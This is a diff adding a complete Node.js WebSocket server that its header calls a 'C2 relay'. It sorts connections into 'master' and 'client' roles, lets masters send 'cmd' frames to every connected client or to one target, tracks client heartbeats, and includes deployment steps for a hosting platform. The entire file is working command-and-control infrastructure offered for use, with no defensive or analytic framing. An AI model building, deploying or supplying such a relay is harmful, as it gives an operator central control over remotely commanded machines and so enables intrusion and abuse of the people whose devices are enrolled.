@@ -1,0 +1,157 @@
+// relay.js — WebSocket C2 relay
+// deps: ws, uuid
+// run: npm start
+// deploy: push to GitHub, connect on Railway, they set $PORT automatically.
+
+const WebSocket = require('ws');
+const http = require('http');
+const { v4: uuidv4 } = require('uuid');
+
+const PORT = process.env.PORT || 8080;
+const rooms = new Map(); // room -> Set<ws>
+
+// ----- http health endpoint -----
+const server = http.createServer((req, res) => {
+  if (req.url === '/' || req.url === '/health') {
+    let clients = 0;
+    for (const set of rooms.values()) {
+      for (const ws of set) if (ws.role === 'client') clients++;
+    }
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ ok: true, rooms: rooms.size, clients }));
+    return;
+  }
+  res.writeHead(404);
+  res.end();
+});
+
+// ----- ws server -----
+const wss = new WebSocket.Server({ server, path: '/ws' });
+
+function addToRoom(room, ws) {
+  if (!rooms.has(room)) rooms.set(room, new Set());
+  rooms.get(room).add(ws);
+}
+
+function removeFromRoom(room, ws) {
+  const set = rooms.get(room);
+  if (!set) return;
+  set.delete(ws);
+  if (set.size === 0) rooms.delete(room);
+}
+
+function broadcast(room, frame, except) {
+  const set = rooms.get(room);
+  if (!set) return;
+  const data = JSON.stringify(frame);
+  for (const ws of set) {
+    if (ws === except) continue;
+    if (ws.readyState === WebSocket.OPEN) ws.send(data);
+  }
+}
+
+function countRole(room, role) {
+  const set = rooms.get(room);
+  if (!set) return 0;
+  let n = 0;
+  for (const ws of set) if (ws.role === role) n++;
+  return n;
+}
+
+wss.on('connection', (ws) => {
+  ws.id = uuidv4();
+  ws.room = null;
+  ws.role = null;
+  ws.lastHb = Date.now();
+
+  ws.on('message', (raw) => {
+    let frame;
+    try { frame = JSON.parse(raw.toString()); } catch { return; }
+
+    // first frame must be hello
+    if (!ws.room) {
+      if (frame.type !== 'hello' || typeof frame.room !== 'string' || !frame.room) {
+        ws.send(JSON.stringify({ type: 'error', error: 'bad_hello' }));
+        ws.close();
+        return;
+      }
+      ws.room = frame.room;
+      ws.role = frame.role === 'master' ? 'master' : 'client';
+      if (frame.id) ws.id = frame.id;
+      addToRoom(ws.room, ws);
+      ws.send(JSON.stringify({
+        type: 'ack',
+        ok: true,
+        id: ws.id,
+        peers: countRole(ws.room, 'client'),
+      }));
+      broadcast(ws.room, {
+        type: 'hello',
+        role: ws.role,
+        id: ws.id,
+        peers: countRole(ws.room, 'client'),
+      }, ws);
+      console.log(`+ ${ws.role} ${ws.id.slice(0, 6)} room=${ws.room.slice(0, 8)} clients=${countRole(ws.room, 'client')}`);
+      return;
+    }
+
+    if (frame.type === 'hb') {
+      ws.lastHb = Date.now();
+      const set = rooms.get(ws.room);
+      if (!set) return;
+      const data = JSON.stringify({ type: 'hb', id: ws.id, ts: frame.ts || Date.now() });
+      for (const peer of set) {
+        if (peer.role === 'master' && peer.readyState === WebSocket.OPEN) peer.send(data);
+      }
+      return;
+    }
+
+    if (frame.type === 'cmd' && ws.role === 'master') {
+      const target = frame.target_id || null;
+      const set = rooms.get(ws.room);
+      if (!set) return;
+      const data = JSON.stringify(frame);
+      for (const peer of set) {
+        if (peer.role !== 'client') continue;
+        if (target && peer.id !== target) continue;
+        if (peer.readyState === WebSocket.OPEN) peer.send(data);
+      }
+      console.log(`> cmd ${frame.cmd} from master ${ws.id.slice(0, 6)} → ${target ? target.slice(0, 6) : 'ALL'}`);
+      return;
+    }
+  });
+
+  ws.on('close', () => {
+    if (ws.room) {
+      removeFromRoom(ws.room, ws);
+      broadcast(ws.room, { type: 'bye', id: ws.id, peers: countRole(ws.room, 'client') }, ws);
+      console.log(`- ${ws.role} ${ws.id.slice(0, 6)} clients=${countRole(ws.room, 'client')}`);
+    }
+  });
+
+  ws.on('error', (err) => {
+    console.log(`! ws error ${ws.id.slice(0, 6)}: ${err.message}`);
+  });
+});
+
+// ----- heartbeat sweep: drop dead sockets -----
+setInterval(() => {
+  const now = Date.now();
+  for (const set of rooms.values()) {
+    for (const ws of set) {
+      if (ws.role === 'client' && now - ws.lastHb > 15000) {
+        try { ws.terminate(); } catch {}
+      }
+    }
+  }
+}, 5000);
+
+server.listen(PORT, () => {
+  console.log(`relay listening on :${PORT}  (ws path /ws, health at /)`);
+});
+
+process.on('SIGTERM', () => {
+  console.log('shutting down');
+  wss.close();
+  server.close(() => process.exit(0));
+});
